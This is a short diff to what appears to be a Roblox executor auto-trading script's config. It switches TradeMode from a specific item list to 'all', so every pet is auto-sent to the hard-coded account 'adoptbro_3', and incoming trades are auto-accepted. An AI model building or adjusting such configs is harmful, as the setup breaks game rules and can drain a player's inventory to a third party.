@@ -28,7 +28,7 @@ getgenv().Config = {
             Enabled = true, -- Enable auto trading
             AutoAcceptTrades = true, -- Accept incoming trade requests
             Usernames = {"adoptbro_3"}, -- Players to send trades to
-            TradeMode = "specific", -- "all" = everything in categories, "specific" = only Items list
+            TradeMode = "all", -- "all" = everything in categories, "specific" = only Items list
             Categories = {"pets"}, -- {"pets", "toys", "food", "transport", "gifts", "stickers", "pet_accessories", "roleplay"}
             Items = {"pet_recycler_2025_giant_panda", "penguins_2025_dango_penguins"}, -- Item IDs when TradeMode = "specific"
             ItemCounts = {10}, -- Max count per item in Items array
